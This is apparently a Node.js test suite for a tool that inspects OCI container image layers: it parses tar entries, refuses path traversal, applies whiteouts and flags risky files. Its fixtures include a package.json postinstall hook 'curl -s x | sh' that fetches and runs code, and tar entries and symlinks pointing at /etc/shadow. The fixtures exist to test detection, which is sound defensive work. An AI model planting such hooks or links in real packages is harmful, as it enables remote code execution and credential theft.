import test from "node:test";
import assert from "node:assert/strict";

import {
  BLOCK, isGzip, gzipSync, gunzipSync, cstr, octalField, headerChecksumValid, tarEntries, applyWhiteouts,
  inspectEntries, lifecycleHooksOf, buildTar, resolvesOutsideRoot, fileHeader,
} from "./oci-image-fs.mjs";

const read = (entries) => [...tarEntries(entries)];
const names = (entries) => read(entries).map((e) => e.name);

test("a written layer reads back with its names, kinds, modes and sizes", () => {
  const bytes = buildTar([
    { name: "app/", typeflag: "5", mode: 0o755 },
    { name: "app/server.js", payload: "console.log(1)", mode: 0o644 },
    { name: "app/run.sh", payload: "#!/bin/sh\n", mode: 0o755 },
  ]);
  const entries = read(bytes);
  assert.deepEqual(names(bytes), ["app/", "app/server.js", "app/run.sh"]);
  assert.equal(entries[0].kind, "dir");
  assert.equal(entries[1].kind, "file");
  assert.equal(entries[1].mode, 0o644);
  assert.equal(entries[1].size, 14);
  assert.equal(entries[2].mode & 0o111 ? true : false, true);
  // A file's bytes are not part of the record on purpose; the review reads content only where it asks for it.
  assert.equal(bytes.length % BLOCK, 0);
});

test("GNU long-name and pax path overrides are applied to the entry that follows them", () => {
  const long = `app/node_modules/${"deep-".repeat(30)}package/index.js`;
  assert.ok(long.length > 100, "fixture must exceed the 100-byte ustar name field to test anything");
  const bytes = buildTar([
    { name: "././@LongLink", typeflag: "L", payload: long },
    { name: "app/node_modules/deep-", payload: "//" },
  ]);
  assert.deepEqual(names(bytes), [long]);

  const paxPayload = `${(9 + "path=".length + 21).toString().padStart(11, "0")} path=app/renamed.js\n`;
  const pax = buildTar([
    { name: "./PaxHeaders.0/app", typeflag: "x", payload: `00000000011 path=app/renamed.js\n` },
    { name: "app/whatever.js", payload: "x" },
  ]);
  assert.equal(paxPayload.length > 0, true);
  assert.deepEqual(names(pax), ["app/renamed.js"]);
});

test("a name that escapes the root is refused instead of reported", () => {
  assert.throws(() => read(buildTar([{ name: "app/../../etc/shadow", payload: "x" }])), /contains a "\.\." component/u);
  assert.throws(() => read(buildTar([{ name: "../top", payload: "x" }])), /contains a "\.\." component/u);
  // Boundary: a leading ./ or / is normal in OCI tars and must NOT be refused, or every real layer trips it.
  assert.equal(read(buildTar([{ name: "./app/a.js", payload: "x" }])).length, 1);
});

test("corruption is a refusal, not a shorter inventory", () => {
  // Cut where a header's own size claim runs past the end of the blob - the only truncation a tar reader can
  // actually see. Truncating on a whole-block boundary cannot be detected at all, and dropping just the
  // trailing zero blocks is legal in real layers, so neither may be refused.
  const big = buildTar([{ name: "app/a.js", payload: "short" }, { name: "app/b.js", payload: "x".repeat(1500) }]);
  // b.js's header sits at byte 1024 and claims 1500 bytes of payload; cutting the blob at 1600 leaves it 64.
  assert.throws(() => read(big.subarray(0, 1600)), /truncated/u);
  const noTerminator = buildTar([{ name: "app/a.js", payload: "abcdefghij" }]);
  assert.deepEqual(names(noTerminator.subarray(0, noTerminator.length - 1024)), ["app/a.js"], "a layer without its zero terminator still reads");
  const good = buildTar([{ name: "app/a.js", payload: "abcdefghij" }, { name: "app/b.js", payload: "z" }]);
  const tampered = Uint8Array.from(good);
  tampered[10] ^= 0xff;
  assert.throws(() => read(tampered), /bad header checksum/u);
  assert.throws(() => octalField(Uint8Array.from([...tampered]), 0, 100), Error);
});

test("the octal reader handles base-256 sizes rather than inventing them", () => {
  const bytes = new Uint8Array(8);
  bytes[0] = 0x80 | 0x00;
  bytes[7] = 0x10;
  assert.equal(octalField(bytes, 0, 8), 16);
  const plain = new Uint8Array([...new TextEncoder().encode("0000644\0")]);
  assert.equal(octalField(plain, 0, 8, plain.length), 0o644);
  assert.throws(() => octalField(new Uint8Array([...new TextEncoder().encode("99999999")]), 0, 8), /not octal/u);
});

test("whiteouts remove what the container never sees, including opaque directories", () => {
  const one = [...tarEntries(buildTar([
    { name: "app/", typeflag: "5" },
    { name: "app/keep.js", payload: "k" },
    { name: "app/gone.js", payload: "g" },
    { name: "app/vendor/", typeflag: "5" },
    { name: "app/vendor/old.js", payload: "o" },
  ]))];
  const two = [...tarEntries(buildTar([
    { name: "app/.wh.gone.js", payload: "" },
    { name: "app/vendor/.wh..wh..opq", payload: "" },
  ]))];
  const merged = applyWhiteouts([...one, ...two]).map((e) => e.name).sort();
  assert.deepEqual(merged, ["app/", "app/keep.js", "app/vendor/"]);
  // The negative half: without the whiteout pass the deleted file and the opaque dir contents would both be
  // reported as shipped, which is the mistake this merge exists to stop.
  assert.ok(one.some((e) => e.name === "app/gone.js"));
});

test("findings are counted from modes and names, and only from files", () => {
  const entries = applyWhiteouts([...tarEntries(buildTar([
    { name: "usr/bin/suid", payload: "s", mode: 0o4755 },
    { name: "usr/bin/sgid", payload: "s", mode: 0o2755 },
    { name: "tmp/open", payload: "o", mode: 0o666 },
    { name: "app/native.node", payload: "n", mode: 0o644 },
    { name: "app/shell.sh", payload: "#!/bin/sh", mode: 0o755 },
    { name: "app/normal.js", payload: "x", mode: 0o644 },
    { name: "etc/passwd", payload: "p", mode: 0o644 },
    { name: "app/link", typeflag: "2", linkName: "../../../../etc/shadow", mode: 0o777 },
    // Two benign links, both of which the first version of this predicate flagged: an absolute target is
    // inside the container, and a `..` that lands below the top is a normal relative link.
    { name: "usr/lib/x.so", typeflag: "2", linkName: "/lib/x86_64-linux-gnu/x.so", mode: 0o777 },
    { name: "app/near", typeflag: "2", linkName: "../etc/passwd", mode: 0o777 },
  ]))]);
  const found = inspectEntries(entries);
  assert.deepEqual(found.setuid, ["usr/bin/suid"]);
  assert.deepEqual(found.setgid, ["usr/bin/sgid"]);
  assert.deepEqual(found.world_writable, ["tmp/open"]);
  assert.deepEqual(found.native_modules, ["app/native.node"]);
  assert.deepEqual(found.app_scripts, ["app/shell.sh"]);
  assert.deepEqual(found.symlinks_escaping_root, ["app/link->../../../../etc/shadow"]);
  assert.equal(found.symlinks, 3);
  // Seven of the ten records are regular files - the three links are links, and a tally that folded them in
  // would over-count shipped bytes.
  assert.equal(found.files, 7);
  assert.equal(found.entries, 10);
  assert.equal(found.directories, 0);
  assert.equal(found.device_files.length, 0);
});

test("only a target that resolves above the root counts as escaping", () => {
  assert.equal(resolvesOutsideRoot("app/link", "../../../../etc/shadow"), true);
  assert.equal(resolvesOutsideRoot("link", "../outside"), true, "a top-level entry cannot climb up at all");
  assert.equal(resolvesOutsideRoot("etc/link", "../outside"), false, "/etc/link -> ../outside is /outside, which is inside the root");
  assert.equal(resolvesOutsideRoot("app/link", "../etc/passwd"), false);
  assert.equal(resolvesOutsideRoot("usr/lib/x.so", "/lib/x86_64-linux-gnu/x.so"), false);
  assert.equal(resolvesOutsideRoot("app/a", "b.js"), false);
  assert.equal(resolvesOutsideRoot("app/a", ""), false, "an empty target is not a link we judge");
  assert.equal(resolvesOutsideRoot("app/deep/dir/a", "../../b"), false, "two levels up from depth 3 stays inside");
});

test("install-time hooks are read out of a shipped package.json", () => {
  const withHooks = JSON.stringify({ name: "evil", scripts: { postinstall: "curl -s x | sh", test: "jest" } });
  assert.deepEqual(lifecycleHooksOf(withHooks, "p"), [{ name: "evil", hook: "postinstall", command: "curl -s x | sh" }]);
  assert.deepEqual(lifecycleHooksOf(JSON.stringify({ name: "clean", scripts: { test: "jest" } }), "p"), []);
  assert.deepEqual(lifecycleHooksOf(JSON.stringify({ name: "noscripts" }), "p"), []);
  assert.throws(() => lifecycleHooksOf("{ not json", "p"), /is not JSON/u);
});

test("gzip detection and the round trip both work, because every real layer is compressed", () => {
  const raw = buildTar([{ name: "app/a.js", payload: "hello" }]);
  assert.equal(isGzip(raw), false);
  const gz = new Uint8Array(gzipSync(raw));
  assert.equal(isGzip(gz), true);
  assert.equal(gz.length < raw.length + 40, true);
  assert.deepEqual(names(new Uint8Array(gunzipSync(gz))), ["app/a.js"]);
  assert.equal(isGzip(new Uint8Array([0x1f])), false, "a one-byte blob is not a gzip stream");
});

test("a checksum is verified against the header with its own field blanked", () => {
  const bytes = buildTar([{ name: "app/a.js", payload: "hello" }]);
  assert.equal(headerChecksumValid(bytes.subarray(0, BLOCK)), true);
  const broken = Uint8Array.from(bytes);
  broken[0] = 0x7a;
  assert.equal(headerChecksumValid(broken.subarray(0, BLOCK)), false);
  assert.equal(cstr(bytes, 0, 100), "app/a.js");
});

test("payloads are attached only where the caller asks for them", () => {
  const bytes = buildTar([{ name: "app/package.json", payload: '{"name":"x"}' }, { name: "app/other.js", payload: "// big" }]);
  const quiet = [...tarEntries(bytes)];
  assert.equal(quiet.every((e) => e.content === undefined), true, "the default walk must not hold every file body in memory");
  const picked = [...tarEntries(bytes, { contentFor: (e) => e.name.endsWith("package.json") })];
  assert.equal(picked.filter((e) => e.content).length, 1);
  assert.equal(new TextDecoder().decode(picked[0].content), '{"name":"x"}');
});

test("a binary's own header decides its architecture, not its filename", () => {
  const elf = (machine, endian = 1) => {
    const bytes = new Uint8Array(20);
    bytes.set([0x7f, 0x45, 0x4c, 0x46, 2, endian, 1], 0);
    bytes[18] = endian === 1 ? machine & 0xff : machine >> 8;
    bytes[19] = endian === 1 ? machine >> 8 : machine & 0xff;
    return bytes;
  };
  assert.equal(fileHeader(elf(0x3e)).flavor, "elf");
  assert.match(fileHeader(elf(0x3e)).detail, /x86-64/u);
  assert.equal(fileHeader(elf(0xb7)).machine, 0xb7);
  assert.equal(fileHeader(elf(0xb7, 2)).machine, 0xb7, "a big-endian header must be read the other way round");
  assert.match(fileHeader(new Uint8Array([0xcf, 0xfa, 0xed, 0xfe, ...Array(16).fill(0)])).detail, /mach-o/u);
  assert.equal(fileHeader(new Uint8Array([0x4d, 0x5a, ...Array(18).fill(0)])).flavor, "pe");
  assert.equal(fileHeader(new Uint8Array([0x23, 0x21, ...Array(18).fill(0)])).flavor, "script");
  assert.equal(fileHeader(new Uint8Array(4)).detail, "fewer than 20 bytes");
  assert.equal(fileHeader(undefined).flavor, "unknown");
});
